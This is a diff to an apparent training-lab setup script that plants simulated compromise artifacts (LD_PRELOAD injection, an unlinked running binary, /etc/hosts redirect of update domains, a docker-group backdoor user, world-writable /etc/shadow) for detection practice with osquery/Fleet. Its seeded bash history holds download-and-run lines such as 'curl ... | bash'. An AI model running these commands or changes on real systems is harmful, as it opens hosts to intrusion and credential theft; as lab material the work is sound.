@@ -270,5 +270,127 @@ chmod 755 "$BEACON" 2>/dev/null || true
 bg_start "c2-beacon.py" python3 "$BEACON" \
     && log "  C2 beacon connecting to 127.0.0.1:9001" || warn "c2 beacon start failed"
 
+###############################################################################
+# Scenario 11 — LD_PRELOAD userland rootkit / library injection  (T1574.006)
+#   Launching a process with LD_PRELOAD pointing at an attacker library is the
+#   classic userland-rootkit hook (hide files/PIDs, sniff credentials). We plant
+#   a benign marker library and run a long-lived victim that carries LD_PRELOAD
+#   in its environment. Detected via process_envs (the injected env var).
+#   NOTE: we deliberately do NOT write /etc/ld.so.preload — that would inject
+#   into EVERY process on the box. The per-process env is the isolated, safe
+#   signal; real rootkits use both, and SCENARIOS.md covers the file angle too.
+###############################################################################
+log "scenario 11: LD_PRELOAD library injection (process_envs) (T1574.006)"
+PRELOAD_LIB=/usr/local/lib/libx86_64.so
+mkdir -p /usr/local/lib 2>/dev/null || true
+# Benign marker file standing in for the malicious .so a real rootkit ships
+# (empty, so glibc just logs "cannot be preloaded" and the victim runs on).
+[ -e "$PRELOAD_LIB" ] || : > "$PRELOAD_LIB" 2>/dev/null || true
+# Long-lived victim whose /proc/<pid>/environ carries LD_PRELOAD. The unique
+# marker in the -c body lets bg_start's pgrep guard find it on re-run.
+bg_start "LDPRELOAD_LAB_VICTIM" env LD_PRELOAD="$PRELOAD_LIB" python3 -c '
+# LDPRELOAD_LAB_VICTIM
+import time
+while True:
+    time.sleep(3600)
+' \
+    && log "  LD_PRELOAD victim running ($PRELOAD_LIB)" || warn "LD_PRELOAD victim start failed"
+
+###############################################################################
+# Scenario 12 — Attacker traces in shell history        (T1552.003 / T1070.003)
+#   Root's ~/.bash_history retains the attacker's hands-on-keyboard commands
+#   (download-and-run, base64-decoded payloads) plus a `history -c` clean-up
+#   attempt. Detected via the shell_history table (reads users' history files).
+###############################################################################
+log "scenario 12: attacker traces in /root/.bash_history (shell_history) (T1552.003)"
+HIST=/root/.bash_history
+if ! grep -q 'LABHISTORY' "$HIST" 2>/dev/null; then
+    cat >> "$HIST" <<'HISTEOF' 2>/dev/null || warn "writing bash_history failed"
+id
+uname -a
+wget -q http://198.51.100.13/miner -O /tmp/.cache-daemon   # LABHISTORY
+chmod +x /tmp/.cache-daemon && /tmp/.cache-daemon &
+echo ZWNobyBwd25lZAo= | base64 -d | bash
+curl -fsSL http://198.51.100.13/b.sh | bash
+history -c
+HISTEOF
+    log "  seeded suspicious history lines"
+else
+    log "  bash_history already seeded"
+fi
+
+###############################################################################
+# Scenario 13 — Fileless: deleted binary still running          (T1070.004)
+#   Malware that copies itself, executes, then unlinks the on-disk file leaves
+#   nothing for a file scan — but the kernel still maps /proc/<pid>/exe to the
+#   now-"(deleted)" path. Detected via processes.path ending in "(deleted)".
+###############################################################################
+log "scenario 13: fileless / deleted-binary process (processes '(deleted)') (T1070.004)"
+# Stage in /tmp: it is world-writable AND executable. (/dev/shm is often mounted
+# noexec — e.g. in containers — so a binary staged there could never run.) The
+# teaching signal is the DELETED binary, not the directory; a hidden,
+# system-looking name completes the masquerade.
+GHOST=/tmp/.x11-unix-cache
+if cp -f /bin/sleep "$GHOST" 2>/dev/null && chmod 755 "$GHOST" 2>/dev/null; then
+    if bg_start "$GHOST" "$GHOST" 86400; then
+        # Give the exec a moment to complete, THEN unlink: the on-disk file is
+        # gone but the running PID lives on from the now-orphaned inode.
+        sleep 1
+        rm -f "$GHOST" 2>/dev/null && log "  ghost binary running and unlinked" \
+            || warn "could not unlink ghost binary"
+    else
+        warn "ghost binary start failed"
+    fi
+else
+    warn "could not stage ghost binary"
+fi
+
+###############################################################################
+# Scenario 14 — /etc/hosts hijack of trusted domains    (T1565.001 / T1556)
+#   Mapping software-update / security domains to attacker IPs silently
+#   redirects updates and telemetry to attacker infrastructure (fake patches,
+#   data exfil) with no DNS footprint. Detected via the etc_hosts table.
+#   NOTE: nothing in the running lab resolves these names, so the redirect is
+#   inert here — it only has to be *visible* to osquery.
+###############################################################################
+log "scenario 14: /etc/hosts hijack of update domains (etc_hosts) (T1565.001)"
+if ! grep -q '45.137.21.53' /etc/hosts 2>/dev/null; then
+    cat >> /etc/hosts <<'HOSTSEOF' 2>/dev/null || warn "appending to /etc/hosts failed"
+# perf tuning: pin mirrors   <-- planted; actually a malicious update redirect
+45.137.21.53	security.ubuntu.com
+45.137.21.53	archive.ubuntu.com
+45.137.21.53	deb.debian.org
+HOSTSEOF
+    log "  hijack entries added to /etc/hosts"
+else
+    log "  /etc/hosts hijack already present"
+fi
+
+###############################################################################
+# Scenario 15 — Hidden privilege via the docker group          (T1098 / T1548)
+#   Membership in `docker` (or sudo/wheel/lxd/adm) is effectively root: a docker
+#   group member can `docker run -v /:/host` and read/write the whole host.
+#   A backdoor account slipped into such a group is a stealthy privilege stash.
+#   Detected via user_groups JOIN groups (unexpected members of power groups).
+###############################################################################
+log "scenario 15: backdoor user in the docker group (user_groups) (T1098)"
+# A low-privileged-looking service account...
+if ! id svcagent >/dev/null 2>&1; then
+    useradd -m -s /bin/bash svcagent 2>/dev/null || warn "useradd svcagent failed"
+fi
+# ...quietly granted host-root via the docker group.
+getent group docker >/dev/null 2>&1 || groupadd docker 2>/dev/null || warn "groupadd docker failed"
+if id svcagent >/dev/null 2>&1; then
+    usermod -aG docker svcagent 2>/dev/null \
+        || gpasswd -a svcagent docker 2>/dev/null \
+        || warn "adding svcagent to docker group failed"
+    log "  svcagent added to docker group"
+fi
+
+# Re-assert scenario 8's weakened /etc/shadow permissions LAST: useradd/usermod
+# (scenario 15) and any other tool that edits /etc/shadow rewrite the file and
+# reset its mode, which would silently undo scenario 8's world-writable shadow.
+chmod 0666 /etc/shadow 2>/dev/null || true
+
 log "all scenarios processed. Happy hunting in Fleet (see SCENARIOS.md)."
 exit 0
